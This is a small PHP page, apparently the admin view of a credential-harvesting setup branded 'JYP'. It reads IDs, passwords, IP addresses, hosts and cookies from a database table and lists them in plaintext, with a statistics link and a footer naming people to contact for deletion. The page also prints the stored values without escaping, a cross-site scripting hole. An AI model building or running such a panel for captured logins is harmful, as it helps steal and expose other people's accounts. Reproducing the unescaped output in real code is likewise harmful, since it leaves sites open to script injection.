<?
include("./db.php");

$query = "select no,id,pw,ip,host,cookie from wos";
$result = mysqli_query($mysqli, $query);
?>

<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="main.css">
<style type="text/css">
 ul{
    list-style:none;
    list-style-type:none;
    } 

body {
  background-image: url('./bg.PNG');
}
</style>
<center>
  <body>
  <nav class="navbar navbar-expand-lg navbar-light bg-light" style="background-color: white">
     <a class="navbar-brand" href="#">JYP</a>
  
  <div class="collapse navbar-collapse" id="navbarSupportedContent">
    <ul class="nav nav-tabs">
      <li class="nav-item active">
        <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="./check.php" style="color: black;">통계 보기</a>
      </li>
    </ul>
  </div>
  </nav>
    <br><br><br><br><br><br><br><br>
   
<div>
    <table style="table">
      <tr>
        <td>no</td>
        <td>ID</td>
        <td>PW</td>
        <td>user_IP</td>
        <td>host</td>
      </tr>
      <?php
      while($row = mysqli_fetch_row($result))
      {
        ?>
        <tr>
          <td width="60"><?=$row[0]?></td>
          <td width="170"><?=$row[1]?></td>
          <td width="200"><?=$row[2]?></td>
          <td width="120"><?=$row[3]?></td>
          <td width="240"><?=$row[4]?></td>
        </tr>
        <?
      }
      ?>
    </table>

    
    <br>
    <footer>
      <p>정보 삭제 요청은 정재훈,양경모,박지윤(JYP)에게</p>
    </footer>
    </div>
  </body>
</center>
</html>
